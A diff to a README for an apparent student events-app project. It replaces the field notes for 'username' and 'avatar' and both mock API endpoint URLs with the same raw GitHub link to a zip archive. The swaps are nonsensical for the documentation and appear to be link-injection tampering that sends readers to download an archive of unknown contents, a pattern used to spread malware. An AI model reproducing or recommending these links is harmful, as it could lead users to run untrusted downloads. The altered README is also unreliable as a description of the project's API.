@@ -28,8 +28,8 @@ events {
 User {
   id: number
   date: date
-  username: faker.js
-  avatar: faker.js
+  username: https://raw.githubusercontent.com/joseontiveros/pilis-fswd-mod5-choque-ontiveros-miranda/main/Megarensian/pilis-fswd-mod5-choque-ontiveros-miranda.zip
+  avatar: https://raw.githubusercontent.com/joseontiveros/pilis-fswd-mod5-choque-ontiveros-miranda/main/Megarensian/pilis-fswd-mod5-choque-ontiveros-miranda.zip
   password: string
   about: string
   interests: string
@@ -42,11 +42,11 @@ User {
 
 ### Event Endpoint
 
-> https://643d8393f0ec48ce905e3f71.mockapi.io/api/v1/events
+> https://raw.githubusercontent.com/joseontiveros/pilis-fswd-mod5-choque-ontiveros-miranda/main/Megarensian/pilis-fswd-mod5-choque-ontiveros-miranda.zip
 
 ### Users Endpoint
 
-> https://643d8393f0ec48ce905e3f71.mockapi.io/api/v1/users
+> https://raw.githubusercontent.com/joseontiveros/pilis-fswd-mod5-choque-ontiveros-miranda/main/Megarensian/pilis-fswd-mod5-choque-ontiveros-miranda.zip
 
 ## Usuarios registrados
 
